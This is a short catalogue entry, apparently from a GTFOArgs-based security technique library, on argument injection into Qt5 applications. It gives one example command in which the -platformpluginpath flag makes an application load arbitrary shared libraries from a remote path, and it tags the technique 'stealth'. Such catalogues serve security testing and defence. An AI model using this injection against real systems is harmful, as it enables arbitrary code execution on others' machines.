---
trust_level: community
id: argument-injection-qt5
namespace: argument:injection:qt5
name: qt5
description: Argument injection via qt5
version: 1.0.0
capabilities:
- security.execution.command
platforms:
- cross-platform
techniques:
- execution
execution:
  template: qt5
  sandbox: execFile
  timeout_seconds: 30
  shell: false
examples:
- description: The `-platformpluginpath` flag can be used to load arbitrary shared
    libraries from a remote path.
  command: 'qt5_app -platformpluginpath \\foo\bar '
references:
- label: GTFOArgs
  url: https://gtfoargs.github.io/gtfoargs/qt5/
features:
- pipes-stdin
- stealth
---

# qt5

GTFOArgs entry for qt5. This binary can be used to inject arguments for execution, file operations, or other capabilities.
